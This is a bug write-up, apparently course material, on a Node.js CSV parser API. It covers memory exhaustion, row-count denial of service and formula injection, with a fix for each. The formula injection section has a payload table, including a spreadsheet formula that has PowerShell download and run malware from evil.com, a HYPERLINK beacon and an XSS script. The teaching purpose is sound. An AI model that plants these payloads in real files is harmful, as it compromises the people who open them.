# 06-BUGS.md — CSV Parser API (M17)

## Bug 1: Memory Exhaustion (No Streaming)

### WHAT

The buggy implementation loads the entire CSV file into memory as a single string via `file.buffer.toString()`. A large CSV crashes the Node.js process.

### WHY IT HAPPENS

The developer used `multer.memoryStorage()` (common in tutorials) without setting file size limits. They assumed CSV files would always be small.

### ATTACK FLOW DIAGRAM

```
Attacker uploads:
┌─────────────────────────────────────────────┐
│  POST /upload-csv                           │
│  Content-Type: multipart/form-data          │
│  file: 2GB_of_comma_separated_data.csv      │
└─────────────────────────────────────────────┘
              │
              ▼
┌─────────────────────────────────────────────┐
│  multer.memoryStorage()                     │
│  → loads entire file into Buffer            │
│  → buffer.toString() creates 2GB string     │
└─────────────────────────────────────────────┘
              │
              ▼
┌─────────────────────────────────────────────┐
│  V8 Heap Limit Exceeded                     │
│  FATAL ERROR: Reached heap limit            │
│  Process crashes                            │
└─────────────────────────────────────────────┘
```

### THE FIX

Use size limits and streaming:

```typescript
// WRONG
const upload = multer({ storage: multer.memoryStorage() });
const text = req.file.buffer.toString(); // 2GB = CRASH

// RIGHT
const MAX_FILE_SIZE = 10 * 1024 * 1024; // 10MB
const upload = multer({
  limits: { fileSize: MAX_FILE_SIZE },
  storage: multer.memoryStorage(),
});

// For true large files, use streaming:
import { createReadStream } from "node:fs";
import { parse } from "csv-parse";
createReadStream("huge.csv")
  .pipe(parse({ columns: true }))
  .on("data", (row) => { /* process one row */ });
```

---

## Bug 2: DoS via Row Count (No `maxRows`)

### WHAT

The buggy implementation processes every row in the CSV without limit. A 10M-row CSV hangs the event loop and exhausts memory during object construction.

### WHY IT HAPPENS

The developer assumed reasonable file sizes but did not enforce any limit. Even a 100MB CSV can contain millions of small rows.

### ATTACK FLOW DIAGRAM

```
Attacker uploads:
┌─────────────────────────────────────────────┐
│  10,000,000 rows × 3 columns                │
│  → 10,000,000 row objects                   │
│  → 30,000,000 string values                 │
│  → V8 objects: ~40 bytes each × 10M = 400MB │
│  → Strings: additional hundreds of MB       │
│  → GC pauses: seconds                       │
│  → Event loop blocked: all requests hang    │
└─────────────────────────────────────────────┘
```

### THE FIX

Enforce `maxRows` and abort early:

```typescript
// WRONG
for (let i = 1; i < lines.length; i++) {
  const cells = lines[i].split(",");
  data.push(buildRow(cells)); // No limit!
}

// RIGHT
for (let i = 1; i < lines.length; i++) {
  if (data.length >= maxRows) {
    throw new Error(`Row count exceeds maximum allowed (${maxRows})`);
  }
  const cells = parseLine(lines[i]);
  data.push(buildRow(cells));
}
```

---

## Bug 3: Formula Injection / XSS (No Sanitization)

### WHAT

The buggy implementation returns cell values exactly as they appear in the CSV. Dangerous formulas are passed through to the output, where they can execute in spreadsheet software or web UIs.

### WHY IT HAPPENS

The developer treated CSV as "plain text" and did not know that spreadsheet software interprets cells starting with `=`, `+`, `-`, `@` as formulas.

### ATTACK FLOW DIAGRAM

```
Attacker uploads CSV:
┌─────────────────────────────────────────────┐
│  name,command                               │
│  Alice,=cmd|' /C calc'!A0                   │
│  Bob,+1+1                                   │
│  Carol,@SUM(A1:A10)                         │
└─────────────────────────────────────────────┘
              │
              ▼
┌─────────────────────────────────────────────┐
│  Server parses and returns JSON:            │
│  { "name": "Alice", "command": "=cmd|..." } │
│  { "name": "Bob", "command": "+1+1" }       │
│  { "name": "Carol", "command": "@SUM(...)" }│
└─────────────────────────────────────────────┘
              │
              ▼
┌─────────────────────────────────────────────┐
│  Admin exports to Excel:                    │
│  → Excel sees =cmd|... → executes calc.exe  │
│  → Excel sees +1+1 → evaluates to 2         │
│  → LibreOffice sees @SUM → runs macro       │
└─────────────────────────────────────────────┘
```

### ATTACK PAYLOADS

| Payload | Effect When Opened in Excel |
|---------|----------------------------|
| `=cmd|' /C calc'!A0` | Launches Windows Calculator |
| `=cmd|' /C powershell -Command "IWR http://evil.com/malware.exe -O C:\\tmp\\m.exe; C:\\tmp\\m.exe"'!A0` | Downloads and executes malware |
| `=HYPERLINK("http://evil.com")` | Silent outbound request |
| `+1+1` | Evaluated as formula in LibreOffice |
| `@SUM(A1:A10)` | LibreOffice macro execution |
| `<script>alert(1)</script>` | XSS if rendered as HTML in web UI |

### REAL-WORLD BREACHES

**Shopify Bug Bounty (2017):** Security researchers demonstrated that Shopify's order export CSV did not sanitize formula injection. When a store admin exported orders containing malicious customer data and opened it in Excel, arbitrary commands executed on their machine.

**Multiple SaaS Platforms (2018–2024):** Attackers routinely upload malicious CSVs to contact import, product import, and reporting features. When administrators export and open the data, their machines are compromised. This has affected CRMs, e-commerce platforms, and HR systems.

### THE FIX

Sanitize dangerous cell prefixes:

```typescript
// WRONG
row[header] = cells[j] ?? "";

// RIGHT
function sanitizeCell(value: string): string {
  const dangerous = /^[=+\-@\t\r\n]/;
  if (dangerous.test(value)) {
    return "'" + value;
  }
  return value;
}

row[header] = sanitizeCell(cells[j] ?? "");
```

### WRONG vs RIGHT

| WRONG (Buggy) | RIGHT (Fixed) |
|---------------|---------------|
| `file.buffer.toString()` without limits | Enforce `maxFileSize`, `maxRows`, `maxCellLength` |
| No `maxRows` check | Abort early when `maxRows` exceeded |
| `line.split(',')` | RFC 4180 state-machine parser |
| Return raw cell values | Prefix `=`, `+`, `-`, `@` with `'` |
| Ignore BOM | Strip `\uFEFF` before parsing |

## SOURCES

- [OWASP CSV Injection](https://owasp.org/www-community/attacks/CSV_Injection)
- "The Risks of CSV Injection" by George Mauer, 2017.
- Shopify Bug Bounty Reports, 2017.
